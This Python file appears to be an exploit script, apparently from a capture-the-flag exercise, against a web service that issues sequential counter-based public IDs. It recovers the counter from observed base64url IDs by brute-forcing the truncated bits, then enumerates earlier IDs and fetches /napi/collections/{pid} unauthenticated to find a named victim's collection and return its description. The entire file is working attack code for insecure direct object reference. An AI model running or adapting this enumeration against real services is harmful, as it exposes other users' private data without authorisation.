"""
Counter-based ID generation: each public_id encodes a sequential counter.

The id_server uses a simple counter (0, 1, 2, ...) instead of rand:bytes.
Counter -> 9 bytes (big-endian) -> base64url -> 12 chars -> slice to 11.

The 12th base64url char (6 bits) is dropped, so decoding is lossy.
We recover the counter by enumerating 64 candidates per ID and finding
pairs with small differences (consecutive IDs have gap ~1).
"""

import asyncio
import base64
from typing import Sequence, Optional
import httpx

BURST_SIZE = 4


def _encode_counter(counter: int) -> str:
    """Encode a counter value to a public_id."""
    raw = counter.to_bytes(9, "big")
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")[:11]


def _decode_candidates(public_id: str) -> list[int]:
    """Return all 64 possible counter values for a public_id."""
    padded = public_id + "A"  # pad 12th char with 'A' (= 0)
    try:
        base = int.from_bytes(base64.urlsafe_b64decode(padded + "=="), "big")
    except Exception:
        return []
    # The 12th char contributed 6 unknown bits. Try all 64 values.
    return [(base & ~0x3F) | guess for guess in range(64)]


def recover_state(observed: Sequence[str]) -> Optional[int]:
    """
    Find the counter value corresponding to the first observed ID.

    Strategy: decode all candidates for each ID, find a pair of consecutive
    IDs whose counter difference is small (1-20).
    """
    if len(observed) < 2:
        return None

    cand0 = sorted(_decode_candidates(observed[0]))
    cand1 = sorted(_decode_candidates(observed[1]))

    for c0 in cand0:
        for c1 in cand1:
            diff = c1 - c0
            if 1 <= diff <= 20:
                return c0
    return None


def generate_public_id(counter: int) -> str:
    return _encode_counter(counter)


async def find_victim_collection(
    conn,
    start_counter: int,
    victim_name: str,
    max_reverse: int = 100,
    batch_size: int = 20,
) -> Optional[str]:
    """
    Try counter values start_counter-1, start_counter-2, ..., start_counter-max_reverse.
    For each, compute the public_id and check if it belongs to the victim.
    """
    candidates = [_encode_counter(start_counter - k) for k in range(1, max_reverse + 1)]

    sem = asyncio.Semaphore(batch_size)
    timeout = httpx.Timeout(3.0, connect=3.0)

    async def check(pid: str) -> Optional[str]:
        async with sem:
            try:
                r = await conn.get(
                    f"/napi/collections/{pid}",
                    cookies=None,
                    timeout=timeout,
                )
                if r.status_code != 200:
                    return None
                data = r.json()
                if (
                    data.get("user", {}).get("username", "").lower()
                    != victim_name.lower()
                ):
                    return None
                return data.get("description") or ""
            except Exception:
                return None

    for i in range(0, len(candidates), batch_size):
        batch = candidates[i : i + batch_size]
        results = await asyncio.gather(*[check(pid) for pid in batch])
        for desc in results:
            if desc:
                return desc
    return None
